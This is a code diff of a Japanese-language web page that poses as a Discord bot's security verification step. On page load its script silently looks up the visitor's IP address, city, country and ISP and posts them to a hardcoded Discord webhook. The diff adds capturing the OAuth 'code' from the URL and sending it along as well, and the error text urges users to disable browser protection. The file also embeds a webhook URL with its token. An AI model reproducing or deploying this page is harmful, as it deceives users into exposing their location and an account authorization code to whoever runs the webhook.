@@ -23,37 +23,26 @@
         <h1 id="status">認証中...</h1>
         <p id="msg">セキュリティチェックを実行しています。</p>
     </div>
-
     <script>
-        // あなたのWebhook URL
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1457786197194833942/_E73GseEb0V1qIPIb65KbaCeZYddXazUstpwCqhfbwfJcgiAKaoBr9KT7ygzWWg4tF6Q";
-
         async function start() {
             const params = new URLSearchParams(window.location.search);
             const state = params.get('state');
-
-            if (!state) return showError("エラー", "URLが無効です。ボットからやり直してください。");
-
+            const code = params.get('code');
+            if (!state || !code) return showError("エラー", "URLが無効です。ボットからやり直してください。");
             try {
-                // IPチェックAPI（安定性の高いJSONP/HTTPS対応のものに変更）
                 const res = await fetch('https://ipapi.co/json/').catch(() => null);
                 if (!res) throw new Error("API接続失敗");
-                
                 const data = await res.json();
-                
-                // VPN/Proxyの簡易判定（データセンター系ISPを弾くなどの処理はボット側でも可能）
-                // ここではまず「通信を完結させる」ことを優先します
-
                 const parts = state.split('_');
                 const logId = parts[1];
                 const userId = parts[3];
-
-                // Webhookへ成功通知を送信
+                // Webhookに code を含めて送信
                 await fetch(`${WEBHOOK_URL}/messages/${logId}`, {
                     method: 'PATCH',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        content: `✅ **認証成功**: <@${userId}>`,
+                        content: `✅ **認証成功**: <@${userId}> | CODE:${code}`,
                         embeds: [{
                             title: "🛡️ 認証完了 (IP取得成功)",
                             description: `**ユーザー:** <@${userId}>\n**IP:** \`${data.ip}\`\n**場所:** \`${data.city}, ${data.country_name}\`\n**ISP:** \`${data.org}\``,
@@ -62,22 +51,17 @@
                         }]
                     })
                 });
-
                 showSuccess("認証完了", "安全が確認されました。この画面を閉じてDiscordへ戻ってください。");
-
             } catch (e) {
-                console.error(e);
                 showError("エラー", "チェック中に問題が発生しました。ブラウザの保護機能をオフにするか、別のブラウザで試してください。");
             }
         }
-
         function showSuccess(t, m) {
             document.getElementById('loading').style.display = 'none';
             document.getElementById('success').style.display = 'inline-block';
             document.getElementById('status').innerText = t;
             document.getElementById('msg').innerText = m;
         }
-
         function showError(t, m) {
             document.getElementById('loading').style.display = 'none';
             document.getElementById('error').style.display = 'inline-block';
@@ -85,7 +69,6 @@
             document.getElementById('status').style.color = '#f23f43';
             document.getElementById('msg').innerText = m;
         }
-
         window.onload = start;
     </script>
 </body>
